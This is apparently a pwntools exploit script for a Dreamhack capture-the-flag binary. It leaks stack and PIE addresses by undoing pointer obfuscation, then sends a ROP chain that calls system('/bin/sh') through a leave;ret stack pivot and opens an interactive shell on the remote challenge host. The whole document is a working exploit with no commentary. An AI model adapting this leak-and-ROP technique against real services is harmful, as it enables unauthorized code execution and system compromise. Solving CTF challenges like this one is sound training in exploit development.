from pwn import *

if args.LOCAL:
    io=process('./chall')
    if args.GDB:
        cmd="""
        init-pwndbg
        brva 0x1543
        """
        gdb.attach(io, cmd)
elif args.REMOTE:
    io=remote('host3.dreamhack.games', 18451)
    
elf=context.binary=ELF('./chall')
libc=ELF('./libc-2.31.so')

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

while True:
    try:
        #io=process('./chall')
        io=remote('host3.dreamhack.games', 18451)
        io.recvuntil(b':)')
        io.recvuntil(b':')
        io.send(b'\0')
        io.recvuntil(b':')
        stack=deobfuscate(int(io.recv(18, 16))) >> 12
        print(hex(stack))
        sleep(1)
        io.send(b'\x01'*8)
        sleep(1)
        io.recvuntil(b'Here is your present ')
        io.recv(8)
        leak=u64(io.recv(8))

        pie=(deobfuscate(leak) >> 12) - 0x152d
        print(hex(pie))
        leave_ret=0x000000000000124d+pie
        pop_rdi=0x0000000000001543+pie
        system=elf.sym.system+pie

        bin_sh=stack+0x20

        pl=p64(pop_rdi)+p64(bin_sh)+p64(system)
        io.send(b'/bin/sh\0'+b'\0'*(32-len(pl))+pl+p64(0)+p64(bin_sh+0x10-8)+p64(leave_ret))
        sleep(1)
        io.sendline(b'id')
        io.recvline(timeout=5)
        io.interactive()
    except KeyboardInterrupt:
        io.close()
        exit()
    except EOFError:
        continue

